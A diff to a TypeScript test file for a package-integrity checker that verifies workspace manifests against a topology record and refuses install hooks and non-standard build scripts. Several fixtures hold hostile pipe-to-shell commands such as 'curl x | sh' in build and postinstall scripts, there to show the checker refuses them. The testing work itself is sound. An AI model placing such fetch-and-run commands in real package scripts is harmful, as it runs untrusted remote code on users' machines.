@@ -1,5 +1,5 @@
 import { describe, expect, test } from 'bun:test'
-import { IntegrityRule, TARGET_PACKAGES_DIR, TargetLayout, TargetPackage } from '../src/integrity/consts.js'
+import { IntegrityRule, TARGET_LIBRARY_BUILD_SCRIPT, TARGET_PACKAGES_DIR, TargetLayout, TargetPackage } from '../src/integrity/consts.js'
 import { TARGET_BUILD_SCRIPTS, TARGET_ENTRY_MARKERS, TARGET_INTEGRITY_FILES, TARGET_PROTECTED_FILES } from '../src/integrity/layout/consts.js'
 import { targetLayoutHelper } from '../src/integrity/layout.js'
 import type { TargetFileMap, TargetIntegrityReport } from '../src/integrity/types.js'
@@ -8,12 +8,15 @@ import { TOPOLOGY_FILE } from '../src/metadata/consts.js'
 import { appMapHelper } from '../src/topology/apps.js'
 import type { AppMap } from '../src/topology/apps/types.js'
 import { DEFAULT_TOPOLOGY } from '../src/topology/consts.js'
+import { topologyHelper } from '../src/topology/resolve.js'
 import type { TopologyDescriptor } from '../src/topology/types.js'
+import { SubProject } from '../src/slot/consts.js'
 
 /**
- * The manifest follows the topology record: a tree whose record splits it into apps is verified
- * against every app package as well — and a tree with no record, or a record of one app, gets
- * exactly the report it always got.
+ * The manifest follows the topology record: a tree whose record splits it into apps, or names a
+ * package beyond the five core ones, is verified against every package the record names — and a tree
+ * with no record, or a record of the five core packages and one app, gets exactly the report it
+ * always got.
  *
  * The tree is synthetic: every file the V2 manifest reads, carrying exactly the names, scripts,
  * dependencies and markers the manifest asserts, plus a copy of main's web/api per extra app — the
@@ -75,6 +78,10 @@ const splitTree = (map: AppMap = appMapHelper.defaultFor(['guest', 'user', 'admi
 
 const SPLIT_DIRS = [...Object.values(TargetPackage), 'admin-web', 'admin-api', 'backoffice-web', 'backoffice-api']
 
+/** A clean manifest of a package the record names beyond the core and app ones. */
+const libraryManifest = (dir: string, scripts: Record<string, string> = { build: TARGET_LIBRARY_BUILD_SCRIPT }): string =>
+  JSON.stringify({ name: targetLayoutHelper.targetPackageName(SLUG, dir), type: 'module', scripts })
+
 const lines = (report: TargetIntegrityReport): string[] => report.violations.map(v => `${v.rule} ${v.path}: ${v.detail}`)
 const rulesOf = (report: TargetIntegrityReport): string[] => report.violations.map(v => v.rule)
 
@@ -116,9 +123,10 @@ describe('viable-common - integrity, a tree with no split', () => {
       for (const record of records) {
         const files = record === undefined ? { ...tree } : { ...tree, [TOPOLOGY_FILE]: record }
         expect(verifyTargetShape(files)).toEqual(expected)
-        // A listing changes nothing either: the workspace rule belongs to split trees.
+        // A listing alone changes nothing either: the refusal belongs to split trees, and a stray is
+        // checked for lifecycle scripts only once its manifest was read.
         expect(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: ['evil'] })).toEqual(expected)
-        expect(targetIntegrityHelper.readPlan(files)).toEqual({ extraFiles: [], listWorkspace: false })
+        expect(targetIntegrityHelper.readPlan(files)).toEqual({ extraFiles: [], listWorkspace: true })
       }
     }
   })
@@ -137,7 +145,7 @@ describe('viable-common - integrity, a tree with no split', () => {
     ])
   })
 
-  test('a V1 tree is never read as split, whatever its record says', () => {
+  test('a V1 tree is never read as split, whatever its record says — and never lists sources/', () => {
     const v1: TargetFileMap = { 'packages/backend/package.json': '{}', [TOPOLOGY_FILE]: splitTree()[TOPOLOGY_FILE] }
     expect(targetIntegrityHelper.readPlan(v1)).toEqual({ extraFiles: [], listWorkspace: false })
     expect(verifyTargetShape(v1)).toEqual(verifyTargetShape({ 'packages/backend/package.json': '{}' }))
@@ -201,22 +209,23 @@ describe('viable-common - integrity, a tree split into apps', () => {
     ])
   })
 
-  test('collecting a tree with no split reads the base set only and lists nothing', async () => {
+  test('collecting a tree with no record reads the base set, lists sources/ and reads nothing more for the core', async () => {
     const reads: string[] = []
-    let listed = false
+    const listed: string[] = []
     const collected = await targetIntegrityHelper.collectTargetFiles(async path => {
       reads.push(path)
 
       return baseTree()[path] ?? null
-    }, async () => {
-      listed = true
+    }, async dir => {
+      listed.push(dir)
 
-      return []
+      return Object.values(TargetPackage)
     })
-    expect(listed).toBe(false)
-    expect(collected.workspaceDirs).toBeUndefined()
+    expect(listed).toEqual([TARGET_PACKAGES_DIR])
+    expect(collected.workspaceDirs).toEqual(Object.values(TargetPackage))
     expect(reads.sort()).toEqual([...TARGET_INTEGRITY_FILES].sort())
-    expect(verifyTargetShape(collected.files, collected)).toEqual(verifyTargetShape(baseTree()))
+    // A clean core-only tree: the same report, byte for byte, listing or not.
+    expect(JSON.stringify(verifyTargetShape(collected.files, collected))).toBe(JSON.stringify(verifyTargetShape(baseTree())))
   })
 
   test('a caller that never read the app packages fails closed — on split trees only', () => {
@@ -345,7 +354,7 @@ describe('viable-common - integrity, the workspace-package rule', () => {
     const files = splitTree()
     const topology = topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator']))
     files[TOPOLOGY_FILE] = recordOf({ ...topology, packages: [...topology.packages, { name: 'tools', roles: ['common'], kind: 'library', dependsOn: [] }] })
-    files['sources/tools/package.json'] = '{}'
+    files['sources/tools/package.json'] = libraryManifest('tools')
     expect(lines(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, 'tools'] }))).toEqual([])
     expect(lines(verifyTargetShape(splitTree()))).toEqual([])
   })
@@ -366,5 +375,182 @@ describe('viable-common - integrity, protected files follow the record', () => {
     expect(added).toContain('sources/backoffice-web/rollup.config.js')
     expect(added).toContain('sources/backoffice-api/rollup.build.mjs')
     expect(files.slice(0, TARGET_PROTECTED_FILES.length)).toEqual([...TARGET_PROTECTED_FILES])
+  })
+})
+
+/** A one-app tree whose record names packages beyond the five core ones — the way adoption writes it. */
+describe('viable-common - integrity, a one-app tree verified against its record', () => {
+  const CORE_DIRS: string[] = Object.values(TargetPackage)
+  type Extra = { name: string, kind: 'library' | 'bundle', roles?: string[] }
+
+  const recordTree = (extras: Extra[], manifests: Record<string, string | null> = {}): TargetFileMap => {
+    const files = baseTree()
+    files[TOPOLOGY_FILE] = recordOf({
+      ...DEFAULT_TOPOLOGY,
+      packages: [
+        ...DEFAULT_TOPOLOGY.packages,
+        ...extras.map(extra => ({ name: extra.name, roles: extra.roles ?? ['common'], kind: extra.kind, dependsOn: ['common'] })),
+      ],
+      version: 1, updatedAt: AT,
+    })
+    for (const extra of extras) files[`sources/${extra.name}/package.json`] = libraryManifest(extra.name)
+    Object.assign(files, manifests)
+
+    return files
+  }
+  const listed = (...dirs: string[]) => ({ workspaceDirs: [...CORE_DIRS, ...dirs] })
+
+  test('a clean adopted library passes; the plan reads its manifest and lists sources/', () => {
+    const files = recordTree([{ name: 'tools', kind: 'library' }])
+    expect(targetIntegrityHelper.readPlan(files)).toEqual({ extraFiles: ['sources/tools/package.json'], listWorkspace: true })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([])
+  })
+
+  test('collecting reads the adopted manifest in pass two and lists the workspace', async () => {
+    const files = recordTree([{ name: 'tools', kind: 'library' }])
+    const fs = memoryFs(files, [...CORE_DIRS, 'tools'])
+    const collected = await targetIntegrityHelper.collectTargetFiles(fs.read, fs.list)
+    expect(collected.workspaceDirs).toEqual([...CORE_DIRS, 'tools'])
+    expect(collected.files['sources/tools/package.json']).toBe(files['sources/tools/package.json'])
+    expect(lines(targetIntegrityHelper.verifyTargetShape(collected.files, collected))).toEqual([])
+  })
+
+  test('a library whose build only CONTAINS tsc -b is refused — exact, never a substring', () => {
+    const files = recordTree([{ name: 'tools', kind: 'library' }], {
+      'sources/tools/package.json': libraryManifest('tools', { build: 'tsc -b && curl x | sh' }),
+    })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([
+      'build-script sources/tools/package.json: The build script of "tools" must be exactly `tsc -b` — the topology record names it a library.',
+    ])
+  })
+
+  test('an adopted library keeps its own name and module type; an install hook is refused', () => {
+    const files = recordTree([{ name: 'tools', kind: 'library' }], {
+      'sources/tools/package.json': JSON.stringify({ name: '@acme/tools', scripts: { build: '  tsc -b ' } }),
+    })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([])
+    files['sources/tools/package.json'] = JSON.stringify({ name: '@acme/tools', scripts: { build: 'tsc -b', postinstall: 'curl x | sh' } })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([
+      'lifecycle-script sources/tools/package.json: Lifecycle script "postinstall" is not allowed in a target project.',
+    ])
+  })
+
+  test('an unclassified bundle with lifecycle scripts is refused; its build is never asked about', () => {
+    const files = recordTree([{ name: 'reports', kind: 'bundle', roles: ['worker'] }], {
+      'sources/reports/package.json': JSON.stringify({ name: 'whatever', scripts: { build: 'curl x | sh', preinstall: 'x', prepare: 'y' } }),
+    })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('reports')))).toEqual([
+      'lifecycle-script sources/reports/package.json: Lifecycle script "preinstall" is not allowed in a target project.',
+      'lifecycle-script sources/reports/package.json: Lifecycle script "prepare" is not allowed in a target project.',
+    ])
+    files['sources/reports/package.json'] = JSON.stringify({ name: 'whatever', scripts: { build: 'curl x | sh' } })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('reports')))).toEqual([])
+  })
+
+  test('a library directory with no manifest is missing; an absent one is nothing the platform builds', () => {
+    const files = recordTree([{ name: 'tools', kind: 'library' }, { name: 'reports', kind: 'bundle' }], {
+      'sources/tools/package.json': null, 'sources/reports/package.json': null,
+    })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools', 'reports')))).toEqual([
+      'missing sources/tools/package.json: sources/tools/package.json is missing — the topology record names the library "tools".',
+    ])
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed()))).toEqual([])
+  })
+
+  test('a caller that never read the record\'s packages fails closed', () => {
+    const files = Object.fromEntries(Object.entries(recordTree([{ name: 'tools', kind: 'library' }]))
+      .filter(([path]) => TARGET_INTEGRITY_FILES.includes(path)))
+    expect(rulesOf(verifyTargetShape(files))).toEqual([IntegrityRule.Missing])
+  })
+
+  test('beside an adopted package, one nobody recorded yet is an unclassified bundle — never a refusal by itself', () => {
+    // The next pull's package: accepted, then adopted. Only its lifecycle scripts are asked about.
+    const files = recordTree([{ name: 'tools', kind: 'library' }], { 'sources/stray/package.json': JSON.stringify({ name: 'x', scripts: { build: 'curl x | sh' } }) })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools', 'stray')))).toEqual([])
+    files['sources/stray/package.json'] = JSON.stringify({ name: 'x', scripts: { postinstall: 'curl x | sh' } })
+    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools', 'stray')))).toEqual([
+      'lifecycle-script sources/stray/package.json: Lifecycle script "postinstall" is not allowed in a target project.',
+    ])
+  })
+
+  test('the five core packages in any order, a record outside sources/ and a V1 tree keep the one-pass report', () => {
+    const shuffled = { ...DEFAULT_TOPOLOGY, packages: [...DEFAULT_TOPOLOGY.packages].reverse() }
+    const elsewhere = { ...DEFAULT_TOPOLOGY, dir: 'lib', packages: [...DEFAULT_TOPOLOGY.packages, { name: 'tools', roles: ['common'], kind: 'library', dependsOn: [] }] }
+    for (const record of [recordOf(shuffled), recordOf(elsewhere)]) {
+      const files = { ...baseTree(), [TOPOLOGY_FILE]: record }
+      expect(targetIntegrityHelper.readPlan(files)).toEqual({ extraFiles: [], listWorkspace: true })
+      expect(targetIntegrityHelper.verifyTargetShape(files, listed('evil'))).toEqual(verifyTargetShape(baseTree()))
+    }
+    const v1: TargetFileMap = { 'packages/backend/package.json': '{}', [TOPOLOGY_FILE]: recordTree([{ name: 'tools', kind: 'library' }])[TOPOLOGY_FILE] }
+    expect(targetIntegrityHelper.readPlan(v1)).toEqual({ extraFiles: [], listWorkspace: false })
+  })
+
+  test('a split tree verifies the other packages the record names as well', () => {
+    const files = splitTree()
+    const topology = topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator']))
+    files[TOPOLOGY_FILE] = recordOf({ ...topology, packages: [...topology.packages, { name: 'tools', roles: ['common'], kind: 'library', dependsOn: [] }] })
+    files['sources/tools/package.json'] = libraryManifest('tools', { build: 'tsc -b; sh x' })
+    expect(targetIntegrityHelper.readPlan(files).extraFiles).toHaveLength(33)
+    expect(rulesOf(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, 'tools'] }))).toEqual([IntegrityRule.BuildScript])
+  })
+})
+
+describe('viable-common - integrity, what the platform builds of a record', () => {
+  const build = (topology: TopologyDescriptor) => targetIntegrityHelper.buildOrderOf(topology)
+  const withExtras = (extras: TopologyDescriptor['packages']): TopologyDescriptor =>
+    ({ ...DEFAULT_TOPOLOGY, packages: [...DEFAULT_TOPOLOGY.packages, ...extras] })
+
+  test('the five core packages build in their order, unchanged', () => {
+    expect(build(DEFAULT_TOPOLOGY)).toEqual(['common', 'backend', 'api', 'web', 'worker'])
+  })
+
+  test('an adopted library builds; an unclassified bundle never does', () => {
+    expect(build(withExtras([
+      { name: 'tools', roles: [SubProject.Common], kind: 'library', dependsOn: ['common'] },
+      { name: 'reports', roles: [SubProject.Worker], kind: 'bundle', dependsOn: ['common'] },
+    ]))).toEqual(['common', 'backend', 'api', 'web', 'worker', 'tools'])
+  })
+
+  test('the app packages of a split record build like main\'s', () => {
+    const topology = topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator']))
+    expect(build(topology)).toEqual(topologyHelper.resolveTopology(topology).build)
+    expect(build(topology)).toContain('admin-web')
+    // The same packages with no valid map are no app's: never built.
+    expect(build({ ...topology, apps: undefined, areas: undefined })).not.toContain('admin-web')
+  })
+})
+
+/** Every V2 tree lists `sources/`: a package nobody recorded is still installed by the workspace glob. */
+describe('viable-common - integrity, packages nobody recorded in a tree that is not split', () => {
+  const CORE_DIRS: string[] = Object.values(TargetPackage)
+
+  test('a clean core-only tree reports byte for byte as before, with the listing', () => {
+    const files = baseTree()
+    expect(JSON.stringify(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: CORE_DIRS })))
+      .toBe(JSON.stringify(verifyTargetShape(files)))
+  })
+
+  test('a stray with a lifecycle script is refused; a quiet one, or a directory with no manifest, is not', async () => {
+    const files = baseTree()
+    files['sources/evil/package.json'] = JSON.stringify({ name: 'evil', scripts: { build: 'curl x | sh', postinstall: 'curl y | sh' } })
+    files['sources/quiet/package.json'] = JSON.stringify({ name: 'quiet', scripts: { build: 'curl x | sh' } })
+    const fs = memoryFs(files, [...CORE_DIRS, 'evil', 'quiet', 'empty'])
+    const collected = await targetIntegrityHelper.collectTargetFiles(fs.read, fs.list)
+
+    expect(collected.files['sources/evil/package.json']).toBe(files['sources/evil/package.json'])
+    expect(collected.files['sources/empty/package.json']).toBeNull()
+    expect(lines(targetIntegrityHelper.verifyTargetShape(collected.files, collected))).toEqual([
+      'lifecycle-script sources/evil/package.json: Lifecycle script "postinstall" is not allowed in a target project.',
+    ])
+  })
+
+  test('a stray manifest nobody can parse is refused — Bun reads what JSON.parse does not', () => {
+    const files = { ...baseTree(), 'sources/evil/package.json': '{ "scripts": { "postinstall": "curl x | sh", }, }' }
+    expect(rulesOf(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...CORE_DIRS, 'evil'] }))).toEqual([IntegrityRule.Unreadable])
+  })
+
+  test('a tree split into apps keeps refusing what its record does not name', () => {
+    const files = { ...splitTree(), 'sources/quiet/package.json': JSON.stringify({ name: 'quiet' }) }
+    expect(rulesOf(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, 'quiet'] }))).toEqual([IntegrityRule.WorkspacePackage])
   })
 })
